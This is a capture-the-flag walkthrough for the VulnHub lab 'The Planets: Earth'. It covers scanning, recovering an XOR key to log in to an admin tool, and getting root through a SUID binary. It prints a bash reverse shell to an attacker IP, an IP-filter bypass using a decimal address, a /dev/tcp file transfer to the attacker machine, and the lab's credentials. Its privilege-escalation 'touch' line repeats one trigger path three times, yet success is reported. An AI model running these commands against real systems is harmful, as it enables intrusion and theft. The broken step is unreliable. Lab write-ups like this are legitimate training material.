---
tags:
  - VulnHub
  - Linux
  - Easy
  - RCE
  - SUID
  - File-Analysis
---
https://www.vulnhub.com/entry/the-planets-earth,755/
# Add Hosts
Append to the `/etc/hosts` file:
```text
192.168.56.3 earth.local terratest.earth.local
```
# Scanning
Found 2 DNS names with nmap:
```console
$ nmap -p22,80,443 -sV -sC earth.local

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.6 (protocol 2.0)
| ssh-hostkey: 
|   256 5b:2c:3f:dc:8b:76:e9:21:7b:d0:56:24:df:be:e9:a8 (ECDSA)
|_  256 b0:3c:72:3b:72:21:26:ce:3a:84:e8:41:ec:c8:f8:41 (ED25519)
80/tcp  open  http     Apache httpd 2.4.51 ((Fedora) OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9)
|_http-title: Bad Request (400)
|_http-server-header: Apache/2.4.51 (Fedora) OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9
443/tcp open  ssl/http Apache httpd 2.4.51 ((Fedora) OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9)
|_ssl-date: TLS randomness does not represent time
|_http-server-header: Apache/2.4.51 (Fedora) OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9
|_http-title: Test Page for the HTTP Server on Fedora
| http-methods: 
|_  Potentially risky methods: TRACE
| ssl-cert: Subject: commonName=earth.local/stateOrProvinceName=Space
| Subject Alternative Name: DNS:earth.local, DNS:terratest.earth.local
| Not valid before: 2021-10-12T23:26:31
|_Not valid after:  2031-10-10T23:26:31
| tls-alpn: 
|_  http/1.1
MAC Address: 08:00:27:7E:9A:D6 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
```
# Discovery
Site http://earth.local is a secure messaging service in which you insert a plain text message and an encryption key to send an encrypted message. There are already **3 previous encrypted messages**.
# Enumeration
> The website's SSL certificate has expired so cURL should be allowed to make insecure connections with the **-k** parameter.
## Command tool
Found admin command tool at http://earth.local/admin/, but can not access it yet.
## Files

Found [robots.txt](https://terratest.earth.local/robots.txt) file with useful information:
```console
$ curl -k https://terratest.earth.local/robots.txt

User-Agent: *
Disallow: /testingnotes.*
```
Found **username terra** in [testingnotes.txt](https://terratest.earth.local/testingnotes.txt) file which also explains how does the secure messaging system work with **XOR**:
```console
$ curl -k https://terratest.earth.local/testingnotes.txt

Testing secure messaging system notes:
*Using XOR encryption as the algorithm, should be safe as used in RSA.
*Earth has confirmed they have received our sent messages.
*testdata.txt was used to test encryption.
*terra used as username for admin portal.
Todo:
*How do we send our monthly keys to Earth securely? Or should we change keys weekly?
*Need to test different key lengths to protect against bruteforce. How long should the key be?
*Need to improve the interface of the messaging interface and the admin panel, it's currently very basic.
```
Found [testdata.txt](https://terratest.earth.local/testdata.txt) file which was used as the **original message**:
```console
$ curl -k https://terratest.earth.local/testdata.txt

According to radiometric dating estimation and other evidence, Earth formed over 4.5 billion years ago. Within the first billion years of Earth's history, life appeared in the oceans and began to affect Earth's atmosphere and surface, leading to the proliferation of anaerobic and, later, aerobic organisms. Some geological evidence indicates that life may have arisen as early as 4.1 billion years ago.
```
# XOR decryption
## What we know
At some point, the next operation was done: `testdata.txt XOR unknownKey = encryptedMsg`. So, we can get the unknown key by executing: `encryptedMsg XOR testdata.txt`.
## Getting key
Decrypted **original key** with [CyberChef](https://gchq.github.io/CyberChef/#recipe=From_Hex('Auto')XOR(%7B'option':'UTF8','string':'According%20to%20radiometric%20dating%20estimation%20and%20other%20evidence,%20Earth%20formed%20over%204.5%20billion%20years%20ago.%20Within%20the%20first%20billion%20years%20of%20Earth%5C's%20history,%20life%20appeared%20in%20the%20oceans%20and%20began%20to%20affect%20Earth%5C's%20atmosphere%20and%20surface,%20leading%20to%20the%20proliferation%20of%20anaerobic%20and,%20later,%20aerobic%20organisms.%20Some%20geological%20evidence%20indicates%20that%20life%20may%20have%20arisen%20as%20early%20as%204.1%20billion%20years%20ago.'%7D,'Standard',false)&input=MjQwMjExMWIxYTA3MDUwNzBhNDEwMDBhNDMxYTAwMGEwZTBhMGYwNDEwNDYwMTE2NGQwNTBmMDcwYzBmMTU1NDBkMTAxODAwMDAwMDAwMGMwYzA2NDEwZjA5MDE0MjBlMTA1YzBkMDc0ZDA0MTgxYTAxMDQxYzE3MGQ0ZjRjMmMwYzEzMDAwZDQzMGUwZTFjMGEwMDA2NDEwYjQyMGQwNzRkNTU0MDQ2NDUwMzFiMTgwNDBhMDMwNzRkMTgxMTA0MTExYjQxMGYwMDBhNGM0MTMzNWQxYzFkMDQwZjRlMDcwZDA0NTIxMjAxMTExZjFkNGQwMzFkMDkwZjAxMGUwMDQ3MWMwNzAwMTY0NzQ4MWEwYjQxMmIxMjE3MTUxYTUzMWI0MzA0MDAxZTE1MWIxNzFhNDQ0MTAyMGUwMzA3NDEwNTQ0MTgxMDBjMTMwYjE3NDUwODFjNTQxYzBiMDk0OTAyMDIxMTA0MGQxYjQxMGYwOTAxNDIwMzAxNTMwOTFiNGQxNTAxNTMwNDA3MTQxMTBiMTc0YzJjMGMxMzAwMGQ0NDFiNDEwZjEzMDgwZDEyMTQ1YzBkMDcwODQxMGYxZDAxNDEwMTAxMWEwNTBkMGEwODRkNTQwOTA2MDkwNTA3MDkwMjQyMTUwYjE0MWMxZDA4NDExZTAxMGEwZDFiMTIwZDExMGQxZDA0MGUxYTQ1MGMwZTQxMGYwOTA0MDcxMzBiNTYwMTE2NGQwMDAwMTc0OTQxMWUxNTFjMDYxZTQ1NGQwMDExMTcwYzBhMDgwZDQ3MGExMDA2MDU1YTAxMDYwMDEyNDA1MzM2MGUxZjExNDgwNDA5MDYwMTBlMTMwYzAwMDkwZDRlMDIxMzBiMDUwMTVhMGIxMDRkMDgwMDE3MGMwMjEzMDAwZDEwNGMxZDA1MDAwMDQ1MGYwMTA3MGI0NzA4MDMxODQ0NWMwOTAzMDg0MTBmMDEwYzEyMTcxYTQ4MDIxZjQ5MDgwMDA2MDkxYTQ4MDAxZDQ3NTE0YzUwNDQ1NjAxMTkwMTA4MDExZDQ1MTgxNzE1MWExMDRjMDgwYTBlNWE&oeol=FF): `earthclimatechangebad4humans`.
# Exploitation
Listen to connections to catch the reverse shell:
```bash
nc -lvnp <PORT>
```
Entered to the admin command tool with **username terra** and the **decrypted key**. Then, to bypass the IP filtering parameters, we convert our [IP to decimal](https://iplocation.io/ip-to-decimal/192.168.56.1) and run:
```bash
bash -i >& /dev/tcp/<ATTACKER-DECIMAL-IP>/<PORT> 0>&1
```
Get the user flag:
```bash
cat /var/earth_web/user_flag.txt
```
# Post-Exploitation
## Binary analysis
Found `/usr/bin/reset_root` with **SUID** permissions:
```console
$ find / -perm -4000 2>/dev/null

/usr/bin/reset_root
```
Executing binary:
```console
$ /usr/bin/reset_root

CHECKING IF RESET TRIGGERS PRESENT...
RESET FAILED, ALL TRIGGERS ARE NOT PRESENT.
```
Send file to attacker's machine via netcat:
```bash
# Attacker's machine
nc -lvnp <PORT> > reset_root
```
```bash
# Victim's machine
cat /usr/bin/reset_root > /dev/tcp/<ATTACKER-IP>/<PORT>
```
Analyze binary with [ltrace](https://man7.org/linux/man-pages/man1/ltrace.1.html):
```console
$ ltrace ./reset_root

puts("CHECKING IF RESET TRIGGERS PRESE"...CHECKING IF RESET TRIGGERS PRESENT...
)                                                        = 38
access("/dev/shm/kHgTFI5G", 0)                                                                     = -1
access("/dev/shm/Zw7bV9U5", 0)                                                                     = -1
access("/tmp/kcM0Wewe", 0)                                                                         = -1
puts("RESET FAILED, ALL TRIGGERS ARE N"...RESET FAILED, ALL TRIGGERS ARE NOT PRESENT.
)                                                        = 44
+++ exited (status 0) +++
```
## Privilege Escalation
Created required files in victim's machine:
```bash
touch /dev/shm/kHgTFI5G /dev/shm/kHgTFI5G /dev/shm/kHgTFI5G
```
Execute the binary:
```console
$ ./reset_root

CHECKING IF RESET TRIGGERS PRESENT...
RESET TRIGGERS ARE PRESENT, RESETTING ROOT PASSWORD TO: Earth
```
Become **root** with password `Earth`:
```bash
su root
```
Get the **root flag**:
```bash
cat /root/root_flag.txt
```